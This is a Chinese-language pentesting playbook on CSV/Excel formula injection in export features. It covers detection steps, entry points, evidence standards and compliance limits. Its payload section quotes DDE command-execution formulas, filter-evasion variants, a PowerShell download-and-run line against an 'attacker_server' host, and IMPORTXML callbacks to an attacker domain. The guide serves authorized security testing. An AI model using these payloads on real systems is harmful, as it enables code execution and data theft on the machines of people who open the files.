# CSV / Excel 公式注入（CSV Injection）

> 导出功能（报表/订单/用户列表 → CSV/Excel 下载）把**用户可控数据**原样写进单元格，受害者用 Excel/WPS/LibreOffice 打开时以 `=` `+` `-` `@` 开头的单元格被当公式执行。本质是「存储型客户端代码执行」，打的是**打开文件的人**（常为财务/运营/管理员）。国内企业后台报表导出遍地都是，出货率稳定；单独中危，链 DDE 命令执行可升高危。

**取材来源**：[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)（CSV Injection 章节，payload 逐字摘录）；权威公开源 OWASP / Google Bug Hunter University。

---

## 1. 触发信号

- 任何导出入口：`导出 Excel` / `导出 CSV` / `下载报表` / `/export` `/download` `/report`，导出内容含**用户可控字段**（昵称、备注、地址、商品名、工单内容）。
- 系统有「用户 A 填 → 用户 B（管理员）看导出」的数据流：客服工单、订单备注、审批意见——注入存进去，管理员导出打开即触发。
- 导出文件里可控字段未被清洗：手工把可控字段填 `=1+1`，导出后用文本编辑器打开 CSV 看是否原样保留。

> 路由规则：先确认「可控字段 → 导出文件」通路存在（填探针 → 下载 → 查原文），再谈公式执行。字段被引号转义/前缀处理即不通。

## 2. 高频入口点

| 场景 | 可控字段落点 |
|---|---|
| 电商/OA 后台 | 订单备注、收货地址、发票抬头 → 商家/财务导出 |
| 客服/工单系统 | 工单标题、回复内容 → 运营批量导出 |
| 用户中心 | 昵称、签名、公司名 → 管理员用户列表导出 |
| 金融/保理系统 | 交易备注、凭证描述 | 对账单导出 |

## 3. 探测顺序（从最无害 → 最有杀伤力）

1. **通路确认（无害）**：可控字段填 `=1+1`，导出，文本编辑器看单元格是否保留 `=1+1`（未被加 `'` 前缀或引号包裹）。
2. **盲注外带（无害，推荐首选证据）**：填 `=IMPORTXML("http://<collaborator>/csv", "//a/@href")`（仅 Google Sheets 导入场景有效，Excel 不解析该函数），导出后自己用表格软件打开，看出网回调。
3. **DDE 验证（受控）**：本机打开导出文件，`DDE ("cmd";"/C calc";"!A0")` 弹计算器——证明命令执行，截图即证据。
4. **真实受害者路径证明**：说明「管理员导出并打开即触发」，不实际投递给真实用户。

## 4. Payload 区（每条标注出处）

### 4.1 基础探针

公式可由 `=` `+` `-` `@` 任一开头 `[PayloadsAllTheThings]`。

### 4.2 DDE 命令执行 `[PayloadsAllTheThings，逐字摘录]`

```text
DDE ("cmd";"/C calc";"!A0")A0
@SUM(1+1)*cmd|' /C calc'!A0
=2+5+cmd|' /C calc'!A0
=cmd|' /C calc'!'A1'
```

PowerShell 下载执行（**仅授权环境验证，默认不落地**）`[PayloadsAllTheThings]`：

```text
=cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0
```

### 4.3 混淆与绕过 `[PayloadsAllTheThings，逐字摘录]`

```text
# 前缀混淆（无效算式 + & 拼接，绕"=cmd 开头"关键字过滤）
=AAAA+BBBB-CCCC&"Hello"/12345&cmd|'/c calc.exe'!A
# 命令链接
=cmd|'/c calc.exe'!A*cmd|'/c calc.exe'!A
# 前置空格
=         cmd|'/c calc.exe'!A
# rundll32 替代 cmd；服务名插任意字符
=rundll32|'URL.dll,OpenURL calc.exe'!A
=rundll321234567890abcdefghijklmnopqrstuvwxyz|'URL.dll,OpenURL calc.exe'!A
# 零字符混淆（非空格，执行时被忽略，绕字典过滤）
=    C    m D                    |        '/        c       c  al  c      .  e                  x       e  '   !   A
```

语法要点 `[PayloadsAllTheThings]`：`cmd`=客户端可访问的服务器名，`/C calc`=要执行的文件，`!A0`=服务器响应的数据单元名。

### 4.4 Google Sheets 专用（远程 URL 公式）`[PayloadsAllTheThings，逐字摘录]`

```text
=IMPORTXML("http://[ATTACKER.DOMAIN.TLD]/csv", "//a/@href")
```

同族：`IMPORTRANGE` / `IMPORTHTML` / `IMPORTFEED` / `IMPORTDATA` 均可请求远程 URL。注意会弹授权警告。

## 5. 工具用法

无需专用工具；配套动作：
- 出网证明用 Burp Collaborator / 自建 HTTP 服务收 `IMPORTXML`/`WEBSERVICE` 回调
- 验证打开行为用本机 Excel/WPS/LibreOffice + 沙箱快照

## 6. 证据要求

**「已确认」必须满足**：① 探针 `=1+1` 在导出文件原文中未被转义（文本编辑器截图）；② 恶意公式触发证据——自己打开导出文件后的计算器弹窗截图（DDE）或 Collaborator 收到回调（盲注外带）；③ 说明真实触发路径（哪个角色导出、哪个字段可控）。
**「疑似」**：只完成通路确认（`=1+1` 原样保留）但未证明执行。

**CVSS 参考**：DDE 命令执行（需受害者打开+确认弹窗，UI:R）`AV:N/AC:H/PR:L/UI:R/S:C/C:H/I:H/A:H ≈ 7.0–7.5`；仅盲注外带降级。

## 7. 合规边界 / 不要做的事

- **禁**：向真实用户/管理员投递带 DDE 执行的导出文件——自己导出自己打开验证即止。
- **禁**：DDE 验证用反弹 shell/真实恶意载荷，弹 `calc` 即为执行证明。
- **注意**：WPS/新版 Office 对 DDE 有确认弹窗，报告中注明「需用户确认」的影响条件，不夸大为静默 RCE。
- **脱敏**：导出文件含他人数据时只留自己的测试记录。
